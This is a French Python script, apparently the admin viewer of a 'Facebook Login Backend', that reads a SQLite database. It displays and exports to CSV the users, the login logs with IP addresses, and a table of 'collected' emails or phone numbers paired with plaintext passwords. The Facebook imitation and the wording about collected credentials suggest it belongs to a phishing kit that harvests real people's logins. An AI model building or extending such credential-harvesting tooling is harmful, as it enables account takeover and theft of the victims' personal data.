#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Script pour afficher les données collectées - Version Simple (sans dépendances)
"""

import sqlite3
from datetime import datetime

DATABASE = 'facebook.db'

def print_header(title):
    """Afficher un en-tête"""
    print("\n" + "=" * 100)
    print(f"  {title}")
    print("=" * 100 + "\n")

def show_users():
    """Afficher tous les utilisateurs enregistrés"""
    print_header("👥 UTILISATEURS ENREGISTRÉS")
    
    try:
        conn = sqlite3.connect(DATABASE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, firstname, lastname, email, birth_date, gender, created_at 
            FROM users
        ''')
        users = cursor.fetchall()
        conn.close()
        
        if not users:
            print("  ❌ Aucun utilisateur trouvé\n")
            return
        
        print(f"  {'ID':<5} {'Prénom':<15} {'Nom':<15} {'Email':<30} {'Sexe':<12} {'Créé le':<20}")
        print("  " + "-" * 97)
        
        for user in users:
            print(f"  {user['id']:<5} {user['firstname']:<15} {user['lastname']:<15} {user['email']:<30} {user['gender']:<12} {user['created_at']:<20}")
        
        print(f"\n  ✓ Total: {len(users)} utilisateur(s)\n")
    
    except Exception as e:
        print(f"  ❌ Erreur: {e}\n")

def show_connection_data():
    """Afficher toutes les données de connexion (email/phone + mots de passe)"""
    print_header("🔐 DONNÉES DE CONNEXION (EMAIL/TÉLÉPHONE + MOTS DE PASSE)")
    
    try:
        conn = sqlite3.connect(DATABASE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, email_or_phone, password, timestamp 
            FROM connection_data 
            ORDER BY timestamp DESC
        ''')
        data = cursor.fetchall()
        conn.close()
        
        if not data:
            print("  ❌ Aucune donnée de connexion trouvée\n")
            return
        
        print(f"  {'ID':<5} {'Email/Téléphone':<30} {'Mot de passe':<25} {'Horodatage':<25}")
        print("  " + "-" * 85)
        
        for row in data:
            print(f"  {row['id']:<5} {row['email_or_phone']:<30} {row['password']:<25} {row['timestamp']:<25}")
        
        print(f"\n  ⚠️  ATTENTION: {len(data)} donnée(s) collectée(s) - À gérer avec prudence!\n")
    
    except Exception as e:
        print(f"  ❌ Erreur: {e}\n")

def show_login_logs():
    """Afficher les logs de connexion"""
    print_header("📋 LOGS DE CONNEXION")
    
    try:
        conn = sqlite3.connect(DATABASE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, email_or_phone, success, ip_address, timestamp 
            FROM login_logs 
            ORDER BY timestamp DESC 
            LIMIT 100
        ''')
        logs = cursor.fetchall()
        conn.close()
        
        if not logs:
            print("  ❌ Aucun log de connexion trouvé\n")
            return
        
        print(f"  {'ID':<5} {'Email/Téléphone':<30} {'Résultat':<12} {'Adresse IP':<20} {'Horodatage':<25}")
        print("  " + "-" * 92)
        
        for log in logs:
            success_text = "✓ Succès" if log['success'] == 1 else "✗ Échoué"
            print(f"  {log['id']:<5} {log['email_or_phone']:<30} {success_text:<12} {log['ip_address']:<20} {log['timestamp']:<25}")
        
        print(f"\n  ✓ {len(logs)} log(s) affiché(s)\n")
    
    except Exception as e:
        print(f"  ❌ Erreur: {e}\n")

def show_stats():
    """Afficher les statistiques"""
    print_header("📊 STATISTIQUES")
    
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM users')
        total_users = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM login_logs')
        total_logins = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM login_logs WHERE success = 1')
        successful_logins = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM login_logs WHERE success = 0')
        failed_logins = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM connection_data')
        total_connections = cursor.fetchone()[0]
        
        conn.close()
        
        print(f"  👥 Utilisateurs enregistrés:       {total_users}")
        print(f"  🔑 Total de tentatives de connexion: {total_logins}")
        print(f"  ✓  Connexions réussies:            {successful_logins}")
        print(f"  ✗  Connexions échouées:            {failed_logins}")
        print(f"  📝 Données de connexion collectées:  {total_connections}")
        
        if total_logins > 0:
            success_rate = (successful_logins / total_logins) * 100
            print(f"  📈 Taux de succès:                 {success_rate:.1f}%")
        
        print()
    
    except Exception as e:
        print(f"  ❌ Erreur: {e}\n")

def export_to_csv():
    """Exporter les données en CSV"""
    print_header("📥 EXPORTER LES DONNÉES EN CSV")
    
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Exporter les utilisateurs
        with open('users.csv', 'w', encoding='utf-8') as f:
            f.write("ID,Prénom,Nom,Email,Date de Naissance,Sexe,Date de Création\n")
            cursor.execute('SELECT id, firstname, lastname, email, birth_date, gender, created_at FROM users')
            for row in cursor.fetchall():
                f.write(f"{row[0]},{row[1]},{row[2]},{row[3]},{row[4]},{row[5]},{row[6]}\n")
        print("  ✓ Fichier 'users.csv' créé")
        
        # Exporter les données de connexion
        with open('connection_data.csv', 'w', encoding='utf-8') as f:
            f.write("ID,Email/Téléphone,Mot de passe,Horodatage\n")
            cursor.execute('SELECT id, email_or_phone, password, timestamp FROM connection_data')
            for row in cursor.fetchall():
                f.write(f"{row[0]},{row[1]},{row[2]},{row[3]}\n")
        print("  ✓ Fichier 'connection_data.csv' créé")
        
        # Exporter les logs
        with open('login_logs.csv', 'w', encoding='utf-8') as f:
            f.write("ID,Email/Téléphone,Succès,Adresse IP,Horodatage\n")
            cursor.execute('SELECT id, email_or_phone, success, ip_address, timestamp FROM login_logs')
            for row in cursor.fetchall():
                success = "1" if row[2] else "0"
                f.write(f"{row[0]},{row[1]},{success},{row[3]},{row[4]}\n")
        print("  ✓ Fichier 'login_logs.csv' créé")
        
        conn.close()
        print("\n  ✓ Données exportées avec succès!\n")
    
    except Exception as e:
        print(f"  ❌ Erreur: {e}\n")

def main():
    """Menu principal"""
    print("\n" + "=" * 100)
    print("  📘 VISUALISEUR DE DONNÉES - Facebook Login Backend")
    print("=" * 100)
    
    while True:
        print("\nMenu Principal:\n")
        print("  1. Afficher les utilisateurs enregistrés")
        print("  2. Afficher les données de connexion (emails/téléphones + mots de passe)")
        print("  3. Afficher les logs de connexion")
        print("  4. Afficher les statistiques")
        print("  5. Afficher tout")
        print("  6. Exporter les données en CSV")
        print("  0. Quitter\n")
        
        choice = input("  Votre choix: ").strip()
        
        if choice == '1':
            show_users()
        elif choice == '2':
            show_connection_data()
        elif choice == '3':
            show_login_logs()
        elif choice == '4':
            show_stats()
        elif choice == '5':
            show_users()
            show_connection_data()
            show_login_logs()
            show_stats()
        elif choice == '6':
            export_to_csv()
        elif choice == '0':
            print("\n  👋 À bientôt!\n")
            break
        else:
            print("\n  ❌ Option invalide, veuillez réessayer\n")

if __name__ == '__main__':
    try:
        # Vérifier que la base de données existe
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = cursor.fetchall()
        conn.close()
        
        if not tables:
            print("\n  ⚠️  La base de données n'a pas encore été créée.")
            print("  Démarrez d'abord le serveur: python app.py\n")
        else:
            main()
    except Exception as e:
        print(f"\n  ❌ Erreur: {e}\n")
